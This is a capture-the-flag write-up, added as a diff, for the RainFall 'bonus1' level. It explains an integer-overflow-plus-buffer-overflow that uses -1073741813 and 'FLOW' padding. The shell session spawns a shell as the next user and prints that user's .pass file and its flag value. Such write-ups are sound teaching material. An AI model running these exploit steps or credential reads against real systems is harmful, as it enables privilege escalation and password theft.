@@ -1,0 +1,18 @@
+the program converts argv[1] to int using atoi(), stores it in variable `k'
+if k is less than 10, the program copies k*4 characters from argv[2] into buffer `buf'
+by making k a negative number we can pass first condition (k < 10)
+our negative number must turn positive when multiplied by 4,
+k*4 should be greater or equal to 44, because bytes [40:44] of argv[2] will overwrite k
+number is easily found via bruteforce search, -1073741813 is one such number
+then program compares k to 0x574f4c46 and if they're equal it executes /bin/sh
+we can overwrite k using argv[2] bytes [40:44] must be hex: 46 4c 4f 57 or ascii 'FLOW'
+
+
+bonus1@RainFall:/tmp$ python -c "print('FLOW'*11)"
+FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
+bonus1@RainFall:/tmp$ /home/user/bonus1/bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+$ 
